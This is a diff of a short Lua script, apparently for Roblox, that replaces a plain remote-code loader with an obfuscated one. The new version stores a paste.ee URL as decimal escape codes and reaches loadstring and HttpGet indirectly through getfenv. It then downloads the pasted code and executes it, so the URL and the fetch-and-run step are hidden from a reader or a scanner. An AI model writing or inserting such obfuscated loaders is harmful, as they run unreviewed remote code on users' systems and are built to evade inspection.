@@ -1,1 +1,16 @@
-loadstring(game:HttpGet("https://paste.ee/r/g9fEn8El"))()
+local Jxv = getfenv and getfenv() or _ENV
+local Rwp = Jxv["loadstring"]
+local Mzt = Jxv["game"]["HttpGet"]
+local Fcl = Jxv["game"]
+
+local function Bqr(Ysl)
+    local Vnk = {}
+    for Pjh = 1, #Ysl do
+        Vnk[#Vnk + 1] = "\\" .. string.byte(Ysl:sub(Pjh, Pjh))
+    end
+    return Rwp(Fcl:HttpGet(Rwp("return \"" .. table.concat(Vnk) .. "\"")()))
+end
+
+local obfURL = "\104\116\116\112\115\58\47\47\112\97\115\116\101\46\101\101\47\114\47\103\57\102\69\110\56\69\108"
+
+Bqr(obfURL)()
